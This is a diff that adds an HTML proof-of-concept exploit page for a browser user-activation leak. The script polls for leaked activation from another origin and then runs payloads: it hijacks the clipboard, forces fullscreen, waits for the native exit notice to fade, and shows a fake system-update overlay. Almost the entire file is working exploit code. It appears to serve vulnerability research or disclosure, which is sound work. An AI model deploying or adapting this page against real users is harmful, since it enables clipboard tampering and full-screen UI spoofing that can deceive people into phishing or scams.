@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC - Target Origin (Exploit)</title>
+    <style>
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            text-align: center; 
+            padding: 50px; 
+            background: #f0f2f5; 
+            transition: background 0.3s;
+        }
+        .container {
+            max-width: 600px;
+            margin: auto;
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        #status-box {
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 2px dashed #ccc;
+            border-radius: 8px;
+            font-weight: bold;
+            color: #666;
+        }
+        .leaked {
+            border-color: #ff4d4d !important;
+            color: #ff4d4d !important;
+            background: #fff5f5;
+        }
+        /* Fake UI Overlay */
+        #fake-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: black;
+            z-index: 99999;
+            color: white;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .loader {
+            border: 4px solid #333;
+            border-top: 4px solid #0078d7;
+            border-radius: 50%;
+            width: 40px; height: 40px;
+            animation: spin 2s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="container" id="main-ui">
+    <h1>Target Page (Origin B)</h1>
+    <p>Monitoring for User Activation Leak...</p>
+    
+    <div id="status-box">
+        STATUS: <span id="status-text">WAITING FOR GESTURE...</span>
+    </div>
+
+    <p style="font-size: 0.9em; color: #888;">
+        Action: Release "Enter" key once this page loads.
+    </p>
+</div>
+
+<div id="fake-overlay">
+    <div class="loader"></div>
+    <h2 style="font-weight: 300;">Working on updates... 45% complete.</h2>
+    <p style="color: #aaa;">Please keep your computer on.</p>
+</div>
+
+<script>
+    const statusText = document.getElementById('status-text');
+    const statusBox = document.getElementById('status-box');
+    const fakeOverlay = document.getElementById('fake-overlay');
+
+    // Start checking for activation leak
+    const checkLeak = setInterval(async () => {
+        const isActive = navigator.userActivation.isActive;
+
+        if (isActive) {
+            clearInterval(checkLeak); // Stop checking once caught
+
+            // 1. UI Update
+            statusText.innerText = "VULNERABLE (ACTIVATION LEAKED!)";
+            statusBox.className = "leaked";
+            console.log("[!] Activation leaked! Executing payloads...");
+
+            // 2. Payload: Clipboard Hijacking
+            try {
+                await navigator.clipboard.writeText("HACKED_BY_GHOST_GESTURE_2026");
+                console.log("[-] Clipboard hijacked successfully.");
+            } catch (err) {
+                console.error("Clipboard failed: ", err);
+            }
+
+            // 3. Payload: Fullscreen Trigger
+            try {
+                await document.documentElement.requestFullscreen();
+                console.log("[-] Fullscreen entered.");
+
+                // 4. Timing Trick: Wait for "Press Esc" native message to disappear (approx 3s)
+                setTimeout(() => {
+                    document.getElementById('main-ui').style.display = 'none';
+                    fakeOverlay.style.display = 'flex';
+                    console.log("[-] Native notification cleared. Showing Fake UI.");
+                }, 3500);
+
+            } catch (err) {
+                console.error("Fullscreen failed: ", err);
+            }
+        }
+    }, 50);
+</script>
+
+</body>
+</html>
